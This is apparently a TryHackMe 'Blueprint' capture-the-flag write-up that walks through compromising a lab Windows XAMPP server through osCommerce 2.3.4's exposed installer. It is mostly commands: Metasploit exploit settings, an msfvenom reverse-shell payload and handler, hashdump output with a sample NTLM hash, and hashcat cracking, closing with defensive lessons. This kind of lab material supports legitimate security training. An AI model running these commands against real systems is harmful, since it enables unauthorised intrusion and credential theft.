# Blueprint - TryHackMe Writeup

**Target:** `TARGET_IP` (10.130.183.22 at time of solve)
**Domain:** `blueprint.thm`
**OS:** Windows (XAMPP on Windows Server)
**Difficulty:** Easy

---

## Attack Chain Overview

```
Port Discovery (80, 443, 445, 3306, 8080, 49152+)
    ?
HTTPS on 443 ? XAMPP ? osCommerce 2.3.4
    ?
Unauthenticated /install/ directory accessible
    ?
Metasploit: exploit/multi/http/oscommerce_installer_unauth_code_exec ? SYSTEM (unstable)
    ?
msfvenom reverse_tcp shell ? upload + execute ? stable Meterpreter
    ?
hashdump ? Administrator NTLM
    ?
Crackstation ? cleartext password
    ?
Root Flag (C:\Users\Administrator\Desktop\)
```

---

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Initial Access](#initial-access)
3. [Stabilizing the Shell](#stabilizing-the-shell)
4. [Post-Exploitation & Credential Dumping](#post-exploitation--credential-dumping)
5. [Root Flag](#root-flag)
6. [Key Takeaways](#key-takeaways)

---

## Reconnaissance

### Host Setup
```bash
export TARGET=10.130.183.22
# What it does: adds machine domains to /etc/hosts.
# Why here: resolve virtual hosts during web enumeration.
echo "$TARGET blueprint.thm" | sudo tee -a /etc/hosts
```

### Port Discovery
```bash
# What it does: run a full port scan on the target IP.
# Why here: identify all active services, revealing a large attack surface including unusual ports like 8080 and 49152+.
nmap -sS -p- --min-rate 5000 -n $TARGET
```

**Open ports:** `80, 443, 445, 3306, 8080, 49152, 49153, 49154, 49160, 49164, 49165` plus AD-related ports (`53, 88, 135, 139`).

### Service Enumeration
```bash
# What it does: perform deep service version detection and run default scripts on all discovered ports.
# Why here: fingerprint the XAMPP stack and confirm the presence of osCommerce via HTTP headers and page content.
nmap -sVC -p53,80,88,135,139,443,445,3306,8080,49152,49153,49154,49160,49164,49165 $TARGET -oA service-scan
```

| Port | Service | Notes |
|------|---------|-------|
| 80 / 443 / 8080 | HTTP / HTTPS (Apache + XAMPP) | Application server |
| 445 | SMB | Windows SMB |
| 3306 | MySQL | Part of XAMPP stack |
| 49152+ | RPC dynamic ports | Windows RPC |

### Web Enumeration

Browsing `https://blueprint.thm/` reveals the default XAMPP dashboard. Content discovery finds an **osCommerce 2.3.4** deployment:

```
https://blueprint.thm/oscommerce-2.3.4/catalog/
```

Key indicator: osCommerce 2.3.4 is known to be vulnerable when the `/install/` directory is left deployed.

**Test for the vulnerable installer:**
```
https://blueprint.thm/oscommerce-2.3.4/catalog/install/index.php
```

The install wizard is publicly reachable — unauthenticated RCE is in play via the installer's configuration write step.

---

## Initial Access

### Exploitation via Metasploit

There is a public Metasploit module that abuses the exposed installer to write PHP to the `configure.php` file and gain code execution.

```bash
# What it does: start the Metasploit console to prepare the osCommerce exploit.
# Why here: leverage the public unauthenticated RCE in the osCommerce installer directory for initial access.
msfconsole
```

```
use exploit/multi/http/oscommerce_installer_unauth_code_exec
set RHOSTS blueprint.thm
set RPORT 443
set SSL true
set TARGETURI /oscommerce-2.3.4/catalog/
set LHOST <ATTACKER_IP>
set LPORT 4444
run
```

A session drops as **NT AUTHORITY\SYSTEM**, but the session is fragile (single-request web shell wrapper). We migrate to a proper reverse shell before doing anything else.

### Stabilizing with msfvenom

In a second terminal, generate a native Meterpreter payload:

```bash
# What it does: generate a standalone Windows Meterpreter reverse TCP payload.
# Why here: provide a stable and full-featured shell to replace the fragile web shell wrapper from the initial exploit.
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=3333 -f exe > shell.exe
```

Prepare a second handler:

```
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <ATTACKER_IP>
set LPORT 3333
run
```

### Upload and Execute

From the first (unstable) session:

```
upload shell.exe C:\\Windows\\Temp\\shell.exe
execute -f C:\\Windows\\Temp\\shell.exe -H
```

The second handler catches a stable Meterpreter session as **SYSTEM**.

---

## Stabilizing the Shell

Verify privileges:

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Drop to a Windows shell only when needed (`shell`) — staying in Meterpreter gives us the built-in `hashdump`.

---

## Post-Exploitation & Credential Dumping

### Hashdump

From the stable Meterpreter session:

```
meterpreter > hashdump
```

**Result (sample):**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<REDACTED_NT>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:<REDACTED_NT>:::
Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
```

The LM portion is blank (standard on modern Windows); the NT hash is what we crack.

### Offline Cracking

Submit the NT hash to [crackstation.net](https://crackstation.net) or run it locally:

```bash
# What it does: crack the captured NTLM hashes using Hashcat.
# Why here: recover the cleartext Administrator password to confirm the host compromise and potentially reuse credentials.
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

The password cracks quickly — it is a rockyou-range password.

---

## Root Flag

With SYSTEM shell already established, the flag is readable directly:

```
meterpreter > cat "C:\\Users\\Administrator\\Desktop\\root.txt"
```

Or from the recovered cleartext password, authenticate cleanly via RDP / WinRM / SMB.

---

## Key Takeaways

| Stage | Technique | Key Detail |
|-------|-----------|------------|
| **Recon** | Service scan + web fingerprint | osCommerce 2.3.4 + exposed `/install/` |
| **Initial Access** | Metasploit `oscommerce_installer_unauth_code_exec` | Unauth RCE via installer config-write |
| **Shell Stabilization** | `msfvenom` + `multi/handler` + `upload`/`execute` | Escape the fragile web-shell wrapper |
| **Credential Dump** | Meterpreter `hashdump` | SAM hashes extracted as SYSTEM |
| **Password Recovery** | Crackstation / hashcat `-m 1000` | NT hash ? cleartext |

### Security Lessons

1. **Never leave installer directories on production** — osCommerce, phpMyAdmin, phpBB all ship install wizards that must be removed post-deploy.
2. **Patch legacy CMS versions** — osCommerce 2.3.4 is end-of-life; public Metasploit modules exist.
3. **Isolate XAMPP from production** — default XAMPP on Windows runs everything as SYSTEM, turning web RCE into a full host compromise.
4. **Enforce strong Administrator passwords** — once SAM hashes are dumped, weak passwords fall in seconds.

### Related Notes
- [metasploit](../../tools/exploitation/metasploit.md) — module delivery
- [hashcat](../../tools/creds/hashcat.md) — NTLM cracking mode `-m 1000`
